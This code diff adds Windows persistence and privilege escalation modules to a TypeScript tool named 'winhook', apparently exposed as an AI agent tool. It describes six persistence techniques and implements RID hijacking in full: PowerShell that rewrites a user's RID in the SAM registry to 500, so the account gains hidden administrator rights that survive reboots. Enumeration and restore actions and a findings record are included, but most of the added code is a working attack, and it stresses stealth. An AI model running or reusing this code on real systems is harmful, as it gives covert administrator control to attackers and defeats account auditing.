@@ -672,6 +672,36 @@ const PROGRAMS = {
       "Image File Execution Options (IFEO) debugger persistence — set a debugger for any executable so your payload runs instead when the target process launches. Supports standard debugger key (visible) and SilentProcessExit monitoring (stealthier, triggers on process exit). Enumerate existing IFEO entries, install, and remove",
     args: "--action enum|install|remove [--target PROCESS.exe] [--payload PATH] [--method debugger|silent-exit]",
   },
+  rid_hijack: {
+    description:
+      "RID hijacking — modify a user's Relative Identifier in the SAM registry to 500 (Administrator) for hidden privilege escalation. The user appears normal in net user output but has full admin rights. Enumerate RIDs, hijack, and restore",
+    args: "--action enum|hijack|restore [--user USERNAME] [--rid NUMBER]",
+  },
+  winlogon_persist: {
+    description:
+      "Winlogon Helper DLL persistence — modify Shell, Userinit, or Notify registry keys under HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon. Payloads execute at every user logon in SYSTEM context. Enumerate current values, install, and restore",
+    args: "--action enum|install|restore [--key shell|userinit|notify] [--payload PATH]",
+  },
+  appinit_dll: {
+    description:
+      "AppInit_DLLs persistence — register a DLL that gets loaded into every process that loads User32.dll (virtually all GUI applications). Mass injection via registry key. Enumerate, install, and remove",
+    args: "--action enum|install|remove [--dll PATH] [--scope machine|wow64]",
+  },
+  netsh_helper: {
+    description:
+      "Netsh Helper DLL persistence — register a DLL as a netsh.exe helper that loads whenever netsh is invoked. Common in admin workflows (firewall, network config). Enumerate existing helpers, install, and remove",
+    args: "--action enum|install|remove [--dll PATH] [--name HELPER_NAME]",
+  },
+  time_provider: {
+    description:
+      "Windows Time Provider DLL persistence — register a DLL as a W32Time service time provider. Runs in SYSTEM context as part of the Windows Time service. Very stealthy — time providers are rarely audited. Enumerate, install, and remove",
+    args: "--action enum|install|remove [--dll PATH] [--name PROVIDER_NAME]",
+  },
+  screensaver_persist: {
+    description:
+      "Screensaver persistence — set a payload as the screensaver executable via SCRNSAVE.EXE registry key. Triggers when the user is idle (configurable timeout). Per-user persistence, no admin required. Enumerate, install, and remove",
+    args: "--action enum|install|remove [--payload PATH] [--timeout SECONDS]",
+  },
 } as const satisfies Record<string, { description: string; args: string }>
 
 type Program = keyof typeof PROGRAMS
@@ -24068,6 +24098,180 @@ Write-Output "[+] All IFEO persistence removed for ${targetProc}"
   return { output: output.join("\n"), findings }
 }
 
+async function ridHijack(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const targetUser = argVal(args, "--user")
+  const targetRid = argVal(args, "--rid") || "500"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] RID Hijacking — SAM Registry Manipulation...\n"]
+
+  if (action === "enum") {
+    const script = `
+Write-Output "=== Local User RID Enumeration ==="
+Write-Output ""
+
+$users = Get-WmiObject Win32_UserAccount -Filter "LocalAccount=True"
+foreach ($u in $users) {
+  $sid = $u.SID
+  $ridHex = $sid.Split('-')[-1]
+  $disabled = if ($u.Disabled) { "[DISABLED]" } else { "[ACTIVE]" }
+  Write-Output "  $($u.Name) | SID: $sid | RID: $ridHex | $disabled"
+}
+Write-Output ""
+
+# Check for existing RID manipulation
+Write-Output "=== SAM Registry F-Value Check ==="
+$samPath = 'HKLM:\\SAM\\SAM\\Domains\\Account\\Users'
+try {
+  $keys = Get-ChildItem $samPath -ErrorAction Stop
+  foreach ($key in $keys) {
+    $name = $key.PSChildName
+    if ($name -eq 'Names') { continue }
+    $f = (Get-ItemProperty $key.PSPath -Name F -ErrorAction SilentlyContinue).F
+    if ($f -and $f.Length -ge 52) {
+      $storedRid = [BitConverter]::ToUInt32($f, 48)
+      $hexKey = $name
+      $expectedRid = [Convert]::ToInt32($hexKey, 16)
+      if ($storedRid -ne $expectedRid) {
+        Write-Output "[!] MISMATCH: Key 0x$hexKey (expected RID $expectedRid) has F-value RID $storedRid"
+        Write-Output "    This indicates RID hijacking is ACTIVE"
+      }
+    }
+  }
+} catch {
+  Write-Output "[!] Cannot read SAM registry — run as SYSTEM (psexec -s -i)"
+  Write-Output "    RID hijacking requires SYSTEM privileges to modify SAM"
+}
+Write-Output ""
+Write-Output "[*] RID 500 = Administrator, 501 = Guest, 1000+ = regular users"
+Write-Output "[*] Hijacking changes a user's effective RID without changing group membership"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    if (r.stdout.includes("MISMATCH")) {
+      findings.push({
+        checkId: "WIN-RID-001",
+        provider: "windows",
+        severity: "critical",
+        status: "HIJACKED",
+        resource: "registry://sam",
+        title: "RID hijacking detected — user has manipulated administrator RID",
+        details: "A user's F-value RID does not match their SAM key, indicating active RID hijacking.",
+        remediation: "Restore original RID or delete the hijacked account.",
+      })
+    }
+  }
+
+  if (action === "hijack") {
+    if (!targetUser) {
+      output.push("ERROR: --user required (username to hijack)")
+      output.push("")
+      output.push("Usage: winhook rid_hijack --action hijack --user lowpriv_user [--rid 500]")
+      output.push("")
+      output.push("[*] Must run as SYSTEM (psexec -s -i cmd)")
+      output.push("[*] Default: hijack to RID 500 (Administrator)")
+      return { output: output.join("\n"), findings }
+    }
+
+    const script = `
+Write-Output "=== RID Hijack: ${targetUser} -> RID ${targetRid} ==="
+Write-Output ""
+
+# Get user SID to find SAM key
+$user = Get-WmiObject Win32_UserAccount -Filter "Name='${targetUser}' AND LocalAccount=True"
+if (-not $user) {
+  Write-Output "[-] User '${targetUser}' not found"
+  exit 1
+}
+
+$rid = [int]($user.SID.Split('-')[-1])
+$hexRid = '{0:X8}' -f $rid
+Write-Output "[*] User: ${targetUser}"
+Write-Output "[*] Current SID: $($user.SID)"
+Write-Output "[*] Current RID: $rid (0x$hexRid)"
+Write-Output "[*] Target RID: ${targetRid}"
+Write-Output ""
+
+$samKey = "HKLM:\\SAM\\SAM\\Domains\\Account\\Users\\$hexRid"
+try {
+  $f = (Get-ItemProperty $samKey -Name F -ErrorAction Stop).F
+  Write-Output "[+] SAM F-value read ($(($f).Length) bytes)"
+
+  # Backup original
+  $originalRid = [BitConverter]::ToUInt32($f, 48)
+  Write-Output "[*] Original RID in F-value: $originalRid"
+
+  # Modify RID at offset 0x30 (48)
+  $newRidBytes = [BitConverter]::GetBytes([uint32]${targetRid})
+  $f[48] = $newRidBytes[0]
+  $f[49] = $newRidBytes[1]
+  $f[50] = $newRidBytes[2]
+  $f[51] = $newRidBytes[3]
+
+  Set-ItemProperty $samKey -Name F -Value $f -Force
+  Write-Output "[+] RID hijacked: ${targetUser} now has effective RID ${targetRid}"
+  Write-Output ""
+  Write-Output "[*] The user still appears as '${targetUser}' in net user"
+  Write-Output "[*] But authentication grants RID ${targetRid} privileges"
+  Write-Output "[*] Survives reboots — SAM registry is persistent"
+  Write-Output ""
+  Write-Output "Restore: winhook rid_hijack --action restore --user ${targetUser} --rid $originalRid"
+  Write-Output "ORIGINAL_RID=$originalRid"
+  Write-Output "STATUS=SUCCESS"
+} catch {
+  Write-Output "[-] Failed: $$($_.Exception.Message)"
+  Write-Output "[!] RID hijacking requires SYSTEM privileges"
+  Write-Output "[*] Use: psexec -s -i cmd, then run this command"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    if (r.stdout.includes("STATUS=SUCCESS")) {
+      findings.push({
+        checkId: "WIN-RID-010",
+        provider: "windows",
+        severity: "critical",
+        status: "HIJACKED",
+        resource: `sam://user/${targetUser}`,
+        title: `RID hijacked: ${targetUser} → RID ${targetRid} (hidden admin)`,
+        details: "User's effective RID changed in SAM F-value. User appears normal but has admin privileges.",
+        remediation: `Restore: winhook rid_hijack --action restore --user ${targetUser}`,
+      })
+    }
+  }
+
+  if (action === "restore") {
+    if (!targetUser) {
+      output.push("ERROR: --user and --rid required")
+      output.push("Usage: winhook rid_hijack --action restore --user USERNAME --rid ORIGINAL_RID")
+      return { output: output.join("\n"), findings }
+    }
+
+    const script = `
+$user = Get-WmiObject Win32_UserAccount -Filter "Name='${targetUser}' AND LocalAccount=True"
+$rid = [int]($user.SID.Split('-')[-1])
+$hexRid = '{0:X8}' -f $rid
+$samKey = "HKLM:\\SAM\\SAM\\Domains\\Account\\Users\\$hexRid"
+
+$f = (Get-ItemProperty $samKey -Name F).F
+$newRidBytes = [BitConverter]::GetBytes([uint32]${targetRid})
+$f[48] = $newRidBytes[0]
+$f[49] = $newRidBytes[1]
+$f[50] = $newRidBytes[2]
+$f[51] = $newRidBytes[3]
+Set-ItemProperty $samKey -Name F -Value $f -Force
+
+Write-Output "[+] RID restored: ${targetUser} -> RID ${targetRid}"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 // ── Dispatch ──
 
 async function privilegeAbuse(args: string[], timeout: number): Promise<HookResult> {
@@ -27711,6 +27915,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   ntlmv1_downgrade: ntlmv1Downgrade,
   accessibility_backdoor: accessibilityBackdoor,
   ifeo_persist: ifeoPersist,
+  rid_hijack: ridHijack,
 }
 
 export const WinhookTool = Tool.define("winhook", {
